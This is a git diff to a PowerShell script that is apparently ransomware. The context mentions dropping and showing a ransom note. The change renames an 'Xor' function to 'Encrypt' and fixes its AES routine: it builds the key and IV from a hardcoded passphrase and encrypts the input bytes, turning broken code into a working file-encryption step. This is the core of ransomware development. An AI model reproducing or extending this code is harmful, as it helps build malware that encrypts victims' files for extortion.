@@ -45,7 +45,7 @@ $notePage = @"
 "@
 
 # inspired from https://gist.github.com/PanosGreg/1453e0b0dcaa64e3e02c5cc7b9b43a8c
-function Xor {
+function Encrypt {
     param($in)
     $key = [System.Text.Encoding]::UTF8.GetBytes("thisisakeythatnoonewillguess!!!1")
     $aesManaged           = [System.Security.Cryptography.AesManaged]::new()
@@ -53,13 +53,13 @@ function Xor {
     $aesManaged.Padding   = [System.Security.Cryptography.PaddingMode]::PKCS7
     $aesManaged.BlockSize = 128
     $aesManaged.KeySize   = 256
-    $aesManaged.Key       = $ByteKey
-    $aesManaged.IV        = $ByteKey[0..15]
-    $encryptor            = $aesManaged.CreateEncryptor()
-    $encryptedData        = $encryptor.TransformFinalBlock($bytes, 0, $bytes.Length)
+    $aesManaged.Key       = $key
+    $aesManaged.IV        = $key[0..15]
+    $encryptor = $aesManaged.CreateEncryptor()
+    $encrypted = $encryptor.TransformFinalBlock($in, 0, $in.Length)
     $aesManaged.Dispose()
     
-    return $encryptedData
+    return $encrypted
 }
 
 # Drop and show ransom note
